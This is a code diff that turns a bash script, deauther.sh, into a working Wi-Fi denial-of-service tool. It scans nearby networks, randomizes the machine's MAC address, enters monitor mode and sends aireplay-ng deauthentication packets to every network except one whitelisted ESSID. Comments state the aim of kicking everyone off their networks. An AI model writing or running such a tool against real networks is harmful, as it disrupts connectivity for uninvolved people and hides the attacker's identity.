@@ -23,17 +23,39 @@
 #SOFTWARE.
 
 ## FUNCTIONS
+# Sends $PACKETS packets to $SSID network using the $INTERFACE interface. Makes sense right?
+function attack(){
+        INTERFACE=$1
+        SSID=$2
+        PACKETS=$3
+        echo "[*] Attacking ${ESSID} - ${SSID} on channel ${CHANNEL} with ${PACKETS} packets"
+        aireplay-ng ${INTERFACE} -0 ${PACKETS} -a ${SSID} >/dev/null 2>&1 && return 0 || return 1
+        # Start kicking every-fucking-body out of their networks
+        # aireplay-ng ${INTERFACE} -0 ${PACKETS} -a ${SSID}
+        # mdk3 ${INTERFACE} d -w <whitelist> -c -> THIS WILL TARGET EVERYONE BUT THE MACs OF THE WHITELIST
+}
+
 # Checks the arguments passed to the tool
 function checkArguments(){
-        if [ $# -ne 1 ];then
+        trap '' 2
+        if [ $# -eq 2 ];then
+                INTERFACE=$1
+                WHITELIST_ESSID=$2
+                echo "[*] WHITELIST_ESSID set to ${WHITELIST_ESSID}"
+                return 0
+        elif [ $# -eq 1 ];then
+                INTERFACE=$1
+                WHITELIST_ESSID=''
+                return  0
+        else
                 usage
                 return 1
         fi
-        return 0
 }
 
 # Check if the system meets the required dependencies
 function checkDependencies(){
+        echo "[*] Checking dependencies"
         if [ -z $(which macchanger) ]; then
                 echo "[-] You need to have installed macchanger"
                 return 1
@@ -42,11 +64,13 @@ function checkDependencies(){
                 echo "[-] You need to have installed aircrack-ng"
                 return 1
         fi
+        echo "[*] All dependencies satisfied"
         return 0
 }
 
 # Checks the exit code of the functions and if not, ouputs error message and exits
 function checkExitCode(){
+        trap '' 2
         if [ $1 -ne 0 ]; then
                 echo "[-] Error: $2"
                 exit
@@ -59,7 +83,7 @@ function checkExitCode(){
 function checkManagedMode(){
         local INTERFACE=$1
         local MODE=$(iwconfig 2>/dev/null | grep -E "${INTERFACE}" -A1 | grep "Mode" | cut -d ':' -f 2 | cut -d' ' -f1 | cut -d' ' -f1)
-        echo "[*] Interface ${INTERFACE} in ${MODE} mode"
+        echo "[*] Interface ${INTERFACE} is in ${MODE} mode"
         if [ $MODE = 'Managed' ]; then
                 return 0
         else
@@ -71,7 +95,7 @@ function checkManagedMode(){
 function checkMonitorMode(){
         local INTERFACE=$1
         local MODE=$(iwconfig 2>/dev/null | grep -E "${INTERFACE}" -A1 | grep "Mode" | cut -d ':' -f 2 | cut -d' ' -f1 | cut -d' ' -f1)
-        echo "[*] Interface ${INTERFACE} in ${MODE} mode"
+        echo "[*] Interface ${INTERFACE} is in ${MODE} mode"
         if [ $MODE = 'Monitor' ]; then
                 return 0
         else
@@ -114,6 +138,28 @@ function managedMode(){
         ifconfig ${INTERFACE} down && iwconfig ${INTERFACE} mode managed && ifconfig ${INTERFACE} up && echo "[*] Interface ${INTERFACE} is now on managed mode" && return 0 || checkExitCode $? "managedMode"
 }
 
+# Sets a random MAC for the wireless interface
+function randomizeMAC(){
+        trap '' 2
+        INTERFACE=$1
+        echo "[*] Randomizing the MAC of the wireless interface"
+        ifconfig ${INTERFACE} down && macchanger -A ${INTERFACE} > /dev/null 2>&1 && ifconfig ${INTERFACE} up && echo "[*] MAC of the wireless interface randomized" && return 0 || return 1
+}
+
+# Sets the hardware MAC for the wireless interface
+function resetMAC(){
+        trap '' 2
+        INTERFACE=$1
+        echo "[*] Resetting the MAC of the wireless interface"
+        ifconfig ${INTERFACE} down && macchanger -p ${INTERFACE} > /dev/null 2>&1 && ifconfig ${INTERFACE} up && echo "[*] MAC of the wireless interface resetted to hardware MAC" && return 0 || return 1
+}
+
+# Restarts the networking services
+function restartNetworkingServices(){
+        echo "[*] Restarting the networking services"
+        service networking restart && service inetsim restart && return 0 || return 1
+}
+
 # Scans for networks and parses the output so we end up with the SSID, frequency, quality and ESSID of the networks, separated by spaces
 function scanAndParse(){
         INTERFACE=$1
@@ -140,19 +186,28 @@ function scanAndParse(){
 
 }
 
+# Sets the channel of the wireless interface
+function setChannel(){
+        INTERFACE=$1
+        CHANNEL=$2
+        iwconfig ${INTERFACE} channel ${CHANNEL} && echo "[*] Channel of the interface ${INTERFACE} set to ${CHANNEL}" && return 0 || return 1
+}
+
 # Outputs the usage
 function usage(){
         echo "[*] Usage: ./deauther.sh <INTERFACE>"
 }
 
 ## MAIN
+declare WHITELIST_ESSID
+declare INTERFACE
 checkArguments $@
 checkExitCode $? "checkArguments"
 
 checkDependencies
 checkExitCode $? "checkDependencies"
 
-checkWirelessInterface $1
+checkWirelessInterface ${INTERFACE}
 checkExitCode $? "checkWirelessInterface"
 
 checkManagedMode $INTERFACE
@@ -162,29 +217,61 @@ if [ $? -eq 1 ]; then
 fi
 
 # Scan for available networks and send output to file
-INTERFACE=$1
+trap '' 2 # Ignore SIGINT
+echo "[*] Scanning for avaiable networks"
+sleep 5 # Give the wireless interface time to get ready
 scanAndParse $INTERFACE | cut -d ' ' -f 4- > deauther_networks_temp.lst
 checkExitCode $? "scanAndParse"
+sleep 5 # Give the wireless interface time to get ready
 scanAndParse $INTERFACE | cut -d ' ' -f 4- >> deauther_networks_temp.lst
 checkExitCode $? "scanAndParse"
+sleep 5 # Give the wireless interface time to get ready
 scanAndParse $INTERFACE | cut -d ' ' -f 4- >> deauther_networks_temp.lst
 checkExitCode $? "scanAndParse"
 cat deauther_networks_temp.lst | sort -u > deauther_networks.lst
 checkExitCode $? "sortNetworksList"
 rm -rf deauther_networks_temp.lst
 checkExitCode $? "removeTemporalNetworksList"
+trap 2 # Stop ignoring SIGINT
 
-# Start sending 20 deauthentication packets to each network (previously put interface in monitor mode)
-#   mdk3
+# Randomize the MAC of the wireless interface
+randomizeMAC ${INTERFACE}
 
-exit
-
+# Put the wireless interface in monitor mode
 checkMonitorMode $INTERFACE
 if [ $? -eq 1 ]; then
         monitorMode $INTERFACE
         checkExitCode $? "monitorMode"
 fi
 
+# Read the file of networks to deauth (deauther_networks.lst)
+FAIL_COUNT=0
+while IFS= read -r LINE; do
+        SSID=$(echo $LINE | cut -d' ' -f2)
+        CHANNEL=$(echo $LINE | cut -d' ' -f6 | cut -d')' -f1)
+        ESSID=$(echo $LINE | cut -d'"' -f2)
+        if [[ "$ESSID" == "$WHITELIST_ESSID" ]]; then
+                continue
+        fi
+        PACKETS=5
+        setChannel ${INTERFACE} ${CHANNEL} >/dev/null 2>&1 && attack ${INTERFACE} ${SSID} ${PACKETS}
+        if [ $? -ne 0 ]; then
+                let FAIL_COUNT++
+        fi
+        if [ $FAIL_COUNT -ge 5 ]; then
+                echo "[-] Too many errors while trying to attack ${ESSID}:${SSID} on channel ${CHANNEL} with ${PACKETS} packets"
+                break
+        fi
+done < deauther_networks.lst
+
+# Reset the MAC of the wireless interface
+resetMAC ${INTERFACE}
+
+# Put the wireless interface in managed mode
 echo "[*] Done"
 managedMode $INTERFACE
 checkExitCode $? "managedMode"
+
+# Restart the networking services
+restartNetworkingServices
+checkExitCode $? "restartNetworkingServices"
